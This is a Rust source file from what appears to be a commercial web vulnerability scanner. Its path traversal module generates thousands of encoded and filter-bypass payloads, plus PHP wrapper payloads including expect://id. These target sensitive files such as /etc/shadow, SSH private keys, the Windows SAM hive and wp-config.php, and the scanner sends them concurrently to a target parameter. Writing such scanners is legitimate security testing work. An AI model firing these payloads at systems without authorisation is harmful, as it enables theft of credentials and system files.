// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::scanners::registry::PayloadIntensity;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use futures::stream::{self, StreamExt};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::{debug, info};

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum TraversalBypassCategory {
    StandardTraversal,
    UrlEncoding,
    DoubleEncoding,
    UnicodeEncoding,
    NullByte,
    PathNormalization,
    FilterBypass,
    WindowsSpecific,
    LinuxSpecific,
    UncPath,
    WrapperProtocol,
}

impl TraversalBypassCategory {
    fn as_str(&self) -> &str {
        match self {
            Self::StandardTraversal => "Standard Traversal",
            Self::UrlEncoding => "URL Encoding",
            Self::DoubleEncoding => "Double Encoding",
            Self::UnicodeEncoding => "Unicode Encoding",
            Self::NullByte => "Null Byte",
            Self::PathNormalization => "Path Normalization",
            Self::FilterBypass => "Filter Bypass",
            Self::WindowsSpecific => "Windows Specific",
            Self::LinuxSpecific => "Linux Specific",
            Self::UncPath => "UNC Path",
            Self::WrapperProtocol => "Wrapper Protocol",
        }
    }
}

struct TraversalPayload {
    payload: String,
    category: TraversalBypassCategory,
    target_file: String,
}

pub struct PathTraversalScanner {
    http_client: Arc<HttpClient>,
}

impl PathTraversalScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan parameter with default intensity (for backwards compatibility)
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Default to Standard intensity if not specified
        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard)
            .await
    }

    /// Scan parameter with specified payload intensity (intelligent mode)
    pub async fn scan_parameter_with_intensity(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
        intensity: PayloadIntensity,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Smart parameter filtering - path traversal needs file/path parameters
        if ParameterFilter::should_skip_parameter(parameter, ScannerType::PathTraversal) {
            debug!(
                "[PathTraversal] Skipping non-file/path parameter: {}",
                parameter
            );
            return Ok((Vec::new(), 0));
        }

        info!("[PathTraversal] Intelligent scanner - testing parameter: {} (priority: {}, intensity: {:?})",
              parameter,
              ParameterFilter::get_parameter_priority(parameter),
              intensity);

        // Generate base payloads based on license tier
        let mut payloads = if crate::license::is_feature_available("enterprise_path_traversal") {
            self.generate_enterprise_payloads()
        } else if crate::license::is_feature_available("path_traversal_scanning") {
            self.generate_professional_payloads()
        } else {
            self.generate_basic_payloads()
        };

        // INTELLIGENT MODE: Limit payloads based on intensity
        let payload_limit = intensity.payload_limit();
        let original_count = payloads.len();

        if payloads.len() > payload_limit {
            // Prioritize payloads: keep diverse categories, not just first N
            payloads = Self::select_diverse_payloads(payloads, payload_limit);
            info!("[PathTraversal] Intelligent mode: limited from {} to {} payloads (intensity: {:?})",
                  original_count, payloads.len(), intensity);
        }

        let total_payloads = payloads.len();
        info!("[PathTraversal] Testing {} payloads", total_payloads);

        // Shared state for early termination
        let found_vuln = Arc::new(AtomicBool::new(false));
        let tests_completed = Arc::new(AtomicUsize::new(0));
        let vulnerabilities = Arc::new(Mutex::new(Vec::new()));

        // Higher concurrency for faster scanning (200 vs 50)
        let concurrent_requests = 200;

        stream::iter(payloads)
            .for_each_concurrent(concurrent_requests, |payload| {
                let url = base_url.to_string();
                let param = parameter.to_string();
                let client = Arc::clone(&self.http_client);
                let found_vuln = Arc::clone(&found_vuln);
                let tests_completed = Arc::clone(&tests_completed);
                let vulnerabilities = Arc::clone(&vulnerabilities);

                async move {
                    // Early termination - skip if we already found a vulnerability
                    if found_vuln.load(Ordering::Relaxed) {
                        return;
                    }

                    let test_url = if url.contains('?') {
                        format!(
                            "{}&{}={}",
                            url,
                            param,
                            urlencoding::encode(&payload.payload)
                        )
                    } else {
                        format!(
                            "{}?{}={}",
                            url,
                            param,
                            urlencoding::encode(&payload.payload)
                        )
                    };

                    if let Ok(response) = client.get(&test_url).await {
                        tests_completed.fetch_add(1, Ordering::Relaxed);

                        if let Some(vuln) = Self::detect_path_traversal_static(
                            &response.body,
                            &payload,
                            &param,
                            &test_url,
                        ) {
                            info!(
                                "[ALERT] Path traversal via {} detected",
                                payload.category.as_str()
                            );
                            found_vuln.store(true, Ordering::Relaxed);
                            let mut vulns = vulnerabilities.lock().await;
                            vulns.push(vuln);
                        }
                    }
                }
            })
            .await;

        // Extract results from Arc<Mutex<Vec>>
        let final_vulns = match Arc::try_unwrap(vulnerabilities) {
            Ok(mutex) => mutex.into_inner(),
            Err(arc) => {
                let guard = arc.lock().await;
                guard.clone()
            }
        };
        let tests_run = tests_completed.load(Ordering::Relaxed);

        info!("[SUCCESS] [PathTraversal] Completed {} tests (skipped {} due to early termination), found {} vulnerabilities",
              tests_run, total_payloads - tests_run, final_vulns.len());
        Ok((final_vulns, total_payloads))
    }

    // ========================================================================
    // INTELLIGENT PAYLOAD SELECTION
    // ========================================================================

    /// Select diverse payloads across categories up to the limit
    /// This ensures we test different bypass techniques rather than just the first N
    fn select_diverse_payloads(
        payloads: Vec<TraversalPayload>,
        limit: usize,
    ) -> Vec<TraversalPayload> {
        use std::collections::HashMap;

        if payloads.len() <= limit {
            return payloads;
        }

        // Group payloads by category
        let mut by_category: HashMap<TraversalBypassCategory, Vec<TraversalPayload>> =
            HashMap::new();
        for payload in payloads {
            by_category
                .entry(payload.category.clone())
                .or_insert_with(Vec::new)
                .push(payload);
        }

        // Calculate how many from each category
        let num_categories = by_category.len();
        let per_category = limit / num_categories.max(1);
        let remainder = limit % num_categories.max(1);

        let mut selected = Vec::with_capacity(limit);
        let mut extra_slots = remainder;

        // Priority order for categories (most likely to succeed first)
        let priority_order = [
            TraversalBypassCategory::StandardTraversal,
            TraversalBypassCategory::UrlEncoding,
            TraversalBypassCategory::FilterBypass,
            TraversalBypassCategory::DoubleEncoding,
            TraversalBypassCategory::NullByte,
            TraversalBypassCategory::WindowsSpecific,
            TraversalBypassCategory::LinuxSpecific,
            TraversalBypassCategory::PathNormalization,
            TraversalBypassCategory::UnicodeEncoding,
            TraversalBypassCategory::UncPath,
            TraversalBypassCategory::WrapperProtocol,
        ];

        for category in &priority_order {
            if let Some(category_payloads) = by_category.get_mut(category) {
                let mut take = per_category;
                if extra_slots > 0 {
                    take += 1;
                    extra_slots -= 1;
                }
                selected.extend(category_payloads.drain(..take.min(category_payloads.len())));
            }
        }

        // If we still haven't filled up, take from any remaining
        for (_cat, mut payloads_in_cat) in by_category {
            if selected.len() >= limit {
                break;
            }
            let remaining = limit - selected.len();
            selected.extend(payloads_in_cat.drain(..remaining.min(payloads_in_cat.len())));
        }

        selected
    }

    // ========================================================================
    // PAYLOAD GENERATORS - Create thousands of variations algorithmically
    // ========================================================================

    /// Generate all traversal sequence variations
    fn generate_traversal_sequences(&self) -> Vec<(String, TraversalBypassCategory)> {
        let mut sequences = Vec::new();

        // Standard traversal sequences
        let standard = vec![
            ("../", TraversalBypassCategory::StandardTraversal),
            ("..\\", TraversalBypassCategory::WindowsSpecific),
        ];

        // URL encoded variations
        let url_encoded = vec![
            ("%2e%2e/", TraversalBypassCategory::UrlEncoding),
            ("%2e%2e%2f", TraversalBypassCategory::UrlEncoding),
            ("..%2f", TraversalBypassCategory::UrlEncoding),
            ("%2e%2e\\", TraversalBypassCategory::UrlEncoding),
            ("%2e%2e%5c", TraversalBypassCategory::UrlEncoding),
            ("..%5c", TraversalBypassCategory::UrlEncoding),
            (".%2e/", TraversalBypassCategory::UrlEncoding),
            (".%2e%2f", TraversalBypassCategory::UrlEncoding),
            ("%2e./", TraversalBypassCategory::UrlEncoding),
            ("%2e.%2f", TraversalBypassCategory::UrlEncoding),
        ];

        // Double URL encoded
        let double_encoded = vec![
            ("%252e%252e/", TraversalBypassCategory::DoubleEncoding),
            ("%252e%252e%252f", TraversalBypassCategory::DoubleEncoding),
            ("..%252f", TraversalBypassCategory::DoubleEncoding),
            ("%252e%252e%255c", TraversalBypassCategory::DoubleEncoding),
            ("..%255c", TraversalBypassCategory::DoubleEncoding),
        ];

        // Triple URL encoded
        let triple_encoded = vec![
            (
                "%25252e%25252e%25252f",
                TraversalBypassCategory::DoubleEncoding,
            ),
            ("..%25252f", TraversalBypassCategory::DoubleEncoding),
        ];

        // Unicode/UTF-8 overlong encoding
        let unicode = vec![
            ("%c0%ae%c0%ae/", TraversalBypassCategory::UnicodeEncoding), // Overlong ..
            (
                "%c0%ae%c0%ae%c0%af",
                TraversalBypassCategory::UnicodeEncoding,
            ),
            ("..%c0%af", TraversalBypassCategory::UnicodeEncoding),
            (
                "%e0%80%ae%e0%80%ae/",
                TraversalBypassCategory::UnicodeEncoding,
            ),
            ("%u002e%u002e/", TraversalBypassCategory::UnicodeEncoding),
            (
                "%u002e%u002e%u002f",
                TraversalBypassCategory::UnicodeEncoding,
            ),
            ("..%u002f", TraversalBypassCategory::UnicodeEncoding),
            ("%uff0e%uff0e/", TraversalBypassCategory::UnicodeEncoding), // Fullwidth
            ("。。/", TraversalBypassCategory::UnicodeEncoding),         // Fullwidth dots
            ("..／", TraversalBypassCategory::UnicodeEncoding),          // Fullwidth slash
        ];

        // Filter bypass patterns
        let filter_bypass = vec![
            ("....//", TraversalBypassCategory::FilterBypass), // Strip ../ leaves ../
            ("....\\\\", TraversalBypassCategory::FilterBypass),
            ("..../", TraversalBypassCategory::FilterBypass),
            ("....\\", TraversalBypassCategory::FilterBypass),
            ("..;/", TraversalBypassCategory::FilterBypass), // Tomcat bypass
            (".../", TraversalBypassCategory::FilterBypass),
            ("...\\", TraversalBypassCategory::FilterBypass),
            ("..././", TraversalBypassCategory::FilterBypass),
            ("..\\.\\", TraversalBypassCategory::FilterBypass),
            ("..\\/", TraversalBypassCategory::FilterBypass),
            ("../\\", TraversalBypassCategory::FilterBypass),
            ("..%00/", TraversalBypassCategory::NullByte),
            ("..%0d/", TraversalBypassCategory::FilterBypass),
            ("..%0a/", TraversalBypassCategory::FilterBypass),
            ("..%09/", TraversalBypassCategory::FilterBypass),
            ("..%20/", TraversalBypassCategory::FilterBypass),
        ];

        sequences.extend(standard.into_iter().map(|(s, c)| (s.to_string(), c)));
        sequences.extend(url_encoded.into_iter().map(|(s, c)| (s.to_string(), c)));
        sequences.extend(double_encoded.into_iter().map(|(s, c)| (s.to_string(), c)));
        sequences.extend(triple_encoded.into_iter().map(|(s, c)| (s.to_string(), c)));
        sequences.extend(unicode.into_iter().map(|(s, c)| (s.to_string(), c)));
        sequences.extend(filter_bypass.into_iter().map(|(s, c)| (s.to_string(), c)));

        sequences
    }

    /// Generate target files for Linux
    fn get_linux_targets(&self) -> Vec<&'static str> {
        vec![
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "etc/hostname",
            "etc/group",
            "etc/issue",
            "etc/motd",
            "etc/resolv.conf",
            "etc/fstab",
            "etc/crontab",
            "etc/sudoers",
            "etc/ssh/sshd_config",
            "etc/apache2/apache2.conf",
            "etc/nginx/nginx.conf",
            "etc/mysql/my.cnf",
            "etc/php/php.ini",
            "proc/self/environ",
            "proc/self/cmdline",
            "proc/self/status",
            "proc/self/fd/0",
            "proc/self/fd/1",
            "proc/self/fd/2",
            "proc/version",
            "proc/net/arp",
            "proc/net/tcp",
            "proc/net/udp",
            "proc/net/fib_trie",
            "proc/mounts",
            "proc/cpuinfo",
            "proc/meminfo",
            "var/log/apache2/access.log",
            "var/log/apache2/error.log",
            "var/log/apache/access.log",
            "var/log/apache/error.log",
            "var/log/nginx/access.log",
            "var/log/nginx/error.log",
            "var/log/httpd/access_log",
            "var/log/httpd/error_log",
            "var/log/auth.log",
            "var/log/syslog",
            "var/log/messages",
            "var/log/secure",
            "var/log/mail.log",
            "var/www/html/index.php",
            "var/www/html/config.php",
            "var/www/html/wp-config.php",
            "var/www/html/.htaccess",
            "home/user/.ssh/id_rsa",
            "home/user/.ssh/id_dsa",
            "home/user/.ssh/authorized_keys",
            "home/user/.bash_history",
            "home/user/.bashrc",
            "root/.ssh/id_rsa",
            "root/.ssh/id_dsa",
            "root/.ssh/authorized_keys",
            "root/.bash_history",
            "root/.bashrc",
            "root/.mysql_history",
        ]
    }

    /// Generate target files for Windows
    fn get_windows_targets(&self) -> Vec<&'static str> {
        vec![
            "windows/win.ini",
            "windows/system.ini",
            "windows/system32/drivers/etc/hosts",
            "windows/system32/config/sam",
            "windows/system32/config/system",
            "windows/system32/config/software",
            "windows/repair/sam",
            "windows/repair/system",
            "windows/debug/netsetup.log",
            "windows/iis.log",
            "winnt/win.ini",
            "winnt/system32/drivers/etc/hosts",
            "boot.ini",
            "inetpub/logs/logfiles",
            "inetpub/wwwroot/web.config",
            "program files/apache group/apache/conf/httpd.conf",
            "program files/apache group/apache2/conf/httpd.conf",
            "xampp/apache/conf/httpd.conf",
            "xampp/php/php.ini",
            "xampp/mysql/bin/my.ini",
            "wamp/bin/apache/apache2.2.17/conf/httpd.conf",
        ]
    }

    /// Generate null byte suffixes
    fn get_null_byte_suffixes(&self) -> Vec<&'static str> {
        vec![
            "",
            "%00",
            "%00.jpg",
            "%00.png",
            "%00.gif",
            "%00.html",
            "%00.php",
            "%00.txt",
            "%00.pdf",
            "\x00",
            "\x00.jpg",
            "%2500",
            "%2500.jpg",
        ]
    }

    /// Generate advanced URL encoding bypass payloads
    fn generate_url_encoding_bypasses(&self) -> Vec<TraversalPayload> {
        let mut payloads = Vec::new();
        let target_file = "etc/passwd";

        // Basic unencoded
        payloads.push(TraversalPayload {
            payload: format!("../../../{}", target_file),
            category: TraversalBypassCategory::StandardTraversal,
            target_file: target_file.to_string(),
        });

        // Single URL encode - full path
        payloads.push(TraversalPayload {
            payload: format!(
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f{}",
                target_file
                    .chars()
                    .map(|c| format!("%{:02x}", c as u8))
                    .collect::<String>()
            ),
            category: TraversalBypassCategory::UrlEncoding,
            target_file: target_file.to_string(),
        });

        // Single encode - just slashes
        payloads.push(TraversalPayload {
            payload: format!("..%2f..%2f..%2f{}", target_file),
            category: TraversalBypassCategory::UrlEncoding,
            target_file: target_file.to_string(),
        });

        // Single encode - dots and slashes
        payloads.push(TraversalPayload {
            payload: format!("%2e%2e%2f%2e%2e%2f%2e%2e%2f{}", target_file),
            category: TraversalBypassCategory::UrlEncoding,
            target_file: target_file.to_string(),
        });

        // Double URL encode
        payloads.push(TraversalPayload {
            payload: format!(
                "..%252f..%252f..%252f{}%252f",
                target_file.split('/').collect::<Vec<_>>().join("%252f")
            ),
            category: TraversalBypassCategory::DoubleEncoding,
            target_file: target_file.to_string(),
        });

        // Double encode - full path
        payloads.push(TraversalPayload {
            payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd".to_string(),
            category: TraversalBypassCategory::DoubleEncoding,
            target_file: target_file.to_string(),
        });

        // Unicode/UTF-8 overlong encoding - %c0%af is overlong /
        payloads.push(TraversalPayload {
            payload: "..%c0%af..%c0%af..%c0%afetc/passwd".to_string(),
            category: TraversalBypassCategory::UnicodeEncoding,
            target_file: target_file.to_string(),
        });

        // Alternative Unicode - %c1%9c
        payloads.push(TraversalPayload {
            payload: "..%c1%9c..%c1%9c..%c1%9cetc/passwd".to_string(),
            category: TraversalBypassCategory::UnicodeEncoding,
            target_file: target_file.to_string(),
        });

        // UTF-8 overlong dots - %c0%ae is overlong .
        payloads.push(TraversalPayload {
            payload: "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd".to_string(),
            category: TraversalBypassCategory::UnicodeEncoding,
            target_file: target_file.to_string(),
        });

        // Mixed encodings
        payloads.push(TraversalPayload {
            payload: "..%2f%2e%2e%2f%252e%252e/etc/passwd".to_string(),
            category: TraversalBypassCategory::UrlEncoding,
            target_file: target_file.to_string(),
        });

        // Test for Windows
        let win_file = "windows/system32/drivers/etc/hosts";

        payloads.push(TraversalPayload {
            payload: format!("..%2f..%2f..%2f{}", win_file),
            category: TraversalBypassCategory::UrlEncoding,
            target_file: win_file.to_string(),
        });

        payloads.push(TraversalPayload {
            payload: format!("..%255c..%255c..%255c{}", win_file.replace("/", "%255c")),
            category: TraversalBypassCategory::DoubleEncoding,
            target_file: win_file.to_string(),
        });

        payloads
    }

    /// Generate platform-specific bypass payloads
    fn generate_platform_specific_bypasses(&self) -> Vec<TraversalPayload> {
        let mut payloads = Vec::new();

        // Windows-specific attacks
        let win_targets = vec![
            ("windows/system32/drivers/etc/hosts", "hosts"),
            ("windows/win.ini", "win.ini"),
            ("windows/system.ini", "system.ini"),
        ];

        for (target, _name) in &win_targets {
            // Standard backslash traversal
            payloads.push(TraversalPayload {
                payload: format!("..\\..\\..\\{}", target.replace("/", "\\")),
                category: TraversalBypassCategory::WindowsSpecific,
                target_file: target.to_string(),
            });

            // UNC path with \\?\ prefix
            payloads.push(TraversalPayload {
                payload: format!("\\\\?\\C:\\{}", target.replace("/", "\\")),
                category: TraversalBypassCategory::UncPath,
                target_file: target.to_string(),
            });

            // UNC path alternative
            payloads.push(TraversalPayload {
                payload: format!("\\\\?\\UNC\\localhost\\C$\\{}", target.replace("/", "\\")),
                category: TraversalBypassCategory::UncPath,
                target_file: target.to_string(),
            });

            // Mixed slashes
            payloads.push(TraversalPayload {
                payload: format!(
                    "../../../{}\\system32/drivers\\etc\\hosts",
                    if target.contains("windows") {
                        "windows"
                    } else {
                        "winnt"
                    }
                ),
                category: TraversalBypassCategory::WindowsSpecific,
                target_file: "windows/system32/drivers/etc/hosts".to_string(),
            });

            // Case insensitivity exploitation
            payloads.push(TraversalPayload {
                payload: "..\\..\\WiNdOwS\\SyStEm32\\DrIvErS\\eTc\\HoStS".to_string(),
                category: TraversalBypassCategory::WindowsSpecific,
                target_file: "windows/system32/drivers/etc/hosts".to_string(),
            });

            payloads.push(TraversalPayload {
                payload: "..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts".to_string(),
                category: TraversalBypassCategory::WindowsSpecific,
                target_file: "windows/system32/drivers/etc/hosts".to_string(),
            });

            // URL encoded backslashes
            payloads.push(TraversalPayload {
                payload: "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts".to_string(),
                category: TraversalBypassCategory::UrlEncoding,
                target_file: "windows/system32/drivers/etc/hosts".to_string(),
            });
        }

        // Linux-specific with absolute paths
        payloads.push(TraversalPayload {
            payload: "/etc/passwd".to_string(),
            category: TraversalBypassCategory::LinuxSpecific,
            target_file: "etc/passwd".to_string(),
        });

        payloads.push(TraversalPayload {
            payload: "/etc/shadow".to_string(),
            category: TraversalBypassCategory::LinuxSpecific,
            target_file: "etc/shadow".to_string(),
        });

        payloads
    }

    /// Generate null byte injection payloads
    fn generate_null_byte_injection_payloads(&self) -> Vec<TraversalPayload> {
        let mut payloads = Vec::new();
        let extensions = vec!["jpg", "png", "gif", "txt", "pdf", "html", "php"];
        let targets = vec![
            ("../../../../etc/passwd", "etc/passwd"),
            ("../../../../etc/shadow", "etc/shadow"),
            (
                "../../../../var/www/html/config.php",
                "var/www/html/config.php",
            ),
        ];

        for (path, target) in &targets {
            // Standard null byte
            payloads.push(TraversalPayload {
                payload: format!("{}%00", path),
                category: TraversalBypassCategory::NullByte,
                target_file: target.to_string(),
            });

            // Null byte with extension
            for ext in &extensions {
                payloads.push(TraversalPayload {
                    payload: format!("{}%00.{}", path, ext),
                    category: TraversalBypassCategory::NullByte,
                    target_file: target.to_string(),
                });
            }

            // Literal \x00
            payloads.push(TraversalPayload {
                payload: format!("{}\x00.jpg", path),
                category: TraversalBypassCategory::NullByte,
                target_file: target.to_string(),
            });

            // Double encoded null byte
            payloads.push(TraversalPayload {
                payload: format!("{}%2500.jpg", path),
                category: TraversalBypassCategory::NullByte,
                target_file: target.to_string(),
            });

            // Null byte in middle
            payloads.push(TraversalPayload {
                payload: format!("{}/../..%00/etc/passwd", path),
                category: TraversalBypassCategory::NullByte,
                target_file: "etc/passwd".to_string(),
            });
        }

        payloads
    }

    /// Generate advanced path manipulation payloads
    fn generate_advanced_path_manipulation(&self) -> Vec<TraversalPayload> {
        let mut payloads = Vec::new();
        let target = "etc/passwd";

        // Dot segments - ....// gets normalized to ../ after filter removal
        payloads.push(TraversalPayload {
            payload: format!(
                "....//....//....//....//....//....//....//....//....//....//....//.....//{}",
                target
            ),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Alternative dot segment pattern
        payloads.push(TraversalPayload {
            payload: format!("....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd"),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Overlong traversal sequences
        payloads.push(TraversalPayload {
            payload: format!(
                "..././..././..././..././..././..././..././..././..././..././..././..././{}",
                target
            ),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Backslash normalization bypass
        payloads.push(TraversalPayload {
            payload: format!(
                "..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/{}",
                target
            ),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // UTF-8 overlong encoding for ../ - %e0%80%ae is overlong .
        payloads.push(TraversalPayload {
            payload: format!("%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/{}", target),
            category: TraversalBypassCategory::UnicodeEncoding,
            target_file: target.to_string(),
        });

        // Overlong UTF-8 slash
        payloads.push(TraversalPayload {
            payload: "..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd".to_string(),
            category: TraversalBypassCategory::UnicodeEncoding,
            target_file: target.to_string(),
        });

        // Mixed overlong sequences
        payloads.push(TraversalPayload {
            payload:
                "%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%afetc/passwd"
                    .to_string(),
            category: TraversalBypassCategory::UnicodeEncoding,
            target_file: target.to_string(),
        });

        // Semicolon bypass (Tomcat)
        payloads.push(TraversalPayload {
            payload: format!("..;/..;/..;/..;/..;/{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Space injection
        payloads.push(TraversalPayload {
            payload: format!("..%20/..%20/..%20/..%20/{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Tab injection
        payloads.push(TraversalPayload {
            payload: format!("..%09/..%09/..%09/..%09/{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Newline/CR injection
        payloads.push(TraversalPayload {
            payload: format!("..%0d/..%0d/..%0d/..%0d/{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        payloads.push(TraversalPayload {
            payload: format!("..%0a/..%0a/..%0a/..%0a/{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Windows-specific advanced
        payloads.push(TraversalPayload {
            payload: "....\\\\....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts"
                .to_string(),
            category: TraversalBypassCategory::WindowsSpecific,
            target_file: "windows/system32/drivers/etc/hosts".to_string(),
        });

        // Triple dot
        payloads.push(TraversalPayload {
            payload: format!(".../.../.../.../{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Forward-backward slash mix
        payloads.push(TraversalPayload {
            payload: format!("../\\../\\../\\../\\{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        // Backward-forward slash mix
        payloads.push(TraversalPayload {
            payload: format!("..\\/../\\/../\\/{}", target),
            category: TraversalBypassCategory::FilterBypass,
            target_file: target.to_string(),
        });

        payloads
    }

    /// Generate PHP wrapper payloads
    fn generate_php_wrapper_payloads(&self) -> Vec<TraversalPayload> {
        let mut payloads = Vec::new();

        let files = vec![
            "etc/passwd",
            "var/www/html/index.php",
            "var/www/html/config.php",
        ];

        // php://filter
        let filters = vec![
            "php://filter/convert.base64-encode/resource=",
            "php://filter/read=string.rot13/resource=",
            "php://filter/read=convert.base64-encode/resource=",
            "php://filter/convert.base64-decode/resource=",
            "php://filter/resource=",
            "php://filter/read=string.toupper/resource=",
            "php://filter/read=string.tolower/resource=",
        ];

        for filter in &filters {
            for file in &files {
                payloads.push(TraversalPayload {
                    payload: format!("{}{}", filter, file),
                    category: TraversalBypassCategory::WrapperProtocol,
                    target_file: file.to_string(),
                });
                // With traversal
                for depth in 1..=5 {
                    let traversal = "../".repeat(depth);
                    payloads.push(TraversalPayload {
                        payload: format!("{}{}{}", filter, traversal, file),
                        category: TraversalBypassCategory::WrapperProtocol,
                        target_file: file.to_string(),
                    });
                }
            }
        }

        // data:// wrapper
        payloads.push(TraversalPayload {
            payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==".to_string(),
            category: TraversalBypassCategory::WrapperProtocol,
            target_file: "phpinfo".to_string(),
        });

        // expect://
        payloads.push(TraversalPayload {
            payload: "expect://id".to_string(),
            category: TraversalBypassCategory::WrapperProtocol,
            target_file: "command".to_string(),
        });

        // file://
        for file in &["etc/passwd", "etc/hosts", "windows/win.ini"] {
            payloads.push(TraversalPayload {
                payload: format!("file:///{}", file),
                category: TraversalBypassCategory::WrapperProtocol,
                target_file: file.to_string(),
            });
            payloads.push(TraversalPayload {
                payload: format!("file://localhost/{}", file),
                category: TraversalBypassCategory::WrapperProtocol,
                target_file: file.to_string(),
            });
        }

        payloads
    }

    /// Generate enterprise-grade payloads (2000+)
    fn generate_enterprise_payloads(&self) -> Vec<TraversalPayload> {
        let mut payloads = Vec::new();

        let sequences = self.generate_traversal_sequences();
        let linux_targets = self.get_linux_targets();
        let windows_targets = self.get_windows_targets();
        let null_suffixes = self.get_null_byte_suffixes();

        // Generate payloads for each traversal depth (1-15)
        for depth in 1..=15 {
            for (seq, category) in &sequences {
                // Build traversal path
                let traversal = seq.repeat(depth);

                // Linux targets
                for target in &linux_targets {
                    // Standard
                    payloads.push(TraversalPayload {
                        payload: format!("{}{}", traversal, target),
                        category: category.clone(),
                        target_file: target.to_string(),
                    });

                    // With null bytes (first few suffixes only to control size)
                    for suffix in null_suffixes.iter().take(5) {
                        if !suffix.is_empty() {
                            payloads.push(TraversalPayload {
                                payload: format!("{}{}{}", traversal, target, suffix),
                                category: TraversalBypassCategory::NullByte,
                                target_file: target.to_string(),
                            });
                        }
                    }

                    // With leading slash
                    payloads.push(TraversalPayload {
                        payload: format!("/{}{}", traversal, target),
                        category: category.clone(),
                        target_file: target.to_string(),
                    });
                }

                // Windows targets (only for backslash or standard sequences)
                if seq.contains("\\") || seq == "../" {
                    for target in &windows_targets {
                        let win_path = if seq.contains("\\") {
                            format!("{}{}", traversal, target.replace("/", "\\"))
                        } else {
                            format!("{}{}", traversal, target)
                        };
                        payloads.push(TraversalPayload {
                            payload: win_path,
                            category: TraversalBypassCategory::WindowsSpecific,
                            target_file: target.to_string(),
                        });
                    }
                }
            }
        }

        // Absolute paths
        for target in &linux_targets {
            payloads.push(TraversalPayload {
                payload: format!("/{}", target),
                category: TraversalBypassCategory::StandardTraversal,
                target_file: target.to_string(),
            });
        }

        // Windows absolute paths
        for target in &windows_targets {
            payloads.push(TraversalPayload {
                payload: format!("c:/{}", target),
                category: TraversalBypassCategory::WindowsSpecific,
                target_file: target.to_string(),
            });
            payloads.push(TraversalPayload {
                payload: format!("c:\\{}", target.replace("/", "\\")),
                category: TraversalBypassCategory::WindowsSpecific,
                target_file: target.to_string(),
            });
        }

        // UNC paths
        for target in &["windows/win.ini", "windows/system32/drivers/etc/hosts"] {
            payloads.push(TraversalPayload {
                payload: format!("\\\\localhost\\c$\\{}", target.replace("/", "\\")),
                category: TraversalBypassCategory::UncPath,
                target_file: target.to_string(),
            });
            payloads.push(TraversalPayload {
                payload: format!("//localhost/c$/{}", target),
                category: TraversalBypassCategory::UncPath,
                target_file: target.to_string(),
            });
        }

        // PHP wrappers
        payloads.extend(self.generate_php_wrapper_payloads());

        // Add advanced bypass techniques
        payloads.extend(self.generate_url_encoding_bypasses());
        payloads.extend(self.generate_platform_specific_bypasses());
        payloads.extend(self.generate_null_byte_injection_payloads());
        payloads.extend(self.generate_advanced_path_manipulation());

        info!(
            "[PathTraversal] Generated {} enterprise payloads",
            payloads.len()
        );
        payloads
    }

    /// Professional tier (subset)
    fn generate_professional_payloads(&self) -> Vec<TraversalPayload> {
        let mut payloads = Vec::new();
        let key_targets = vec!["etc/passwd", "etc/hosts", "windows/win.ini"];
        let key_sequences = vec![
            ("../", TraversalBypassCategory::StandardTraversal),
            ("%2e%2e/", TraversalBypassCategory::UrlEncoding),
            ("....//", TraversalBypassCategory::FilterBypass),
            ("%252e%252e/", TraversalBypassCategory::DoubleEncoding),
        ];

        for depth in 1..=10 {
            for (seq, cat) in &key_sequences {
                let traversal = seq.repeat(depth);
                for target in &key_targets {
                    payloads.push(TraversalPayload {
                        payload: format!("{}{}", traversal, target),
                        category: cat.clone(),
                        target_file: target.to_string(),
                    });
                }
            }
        }

        // Add null byte variants
        for depth in 3..=6 {
            let traversal = "../".repeat(depth);
            for target in &key_targets {
                payloads.push(TraversalPayload {
                    payload: format!("{}{}%00", traversal, target),
                    category: TraversalBypassCategory::NullByte,
                    target_file: target.to_string(),
                });
            }
        }

        payloads
    }

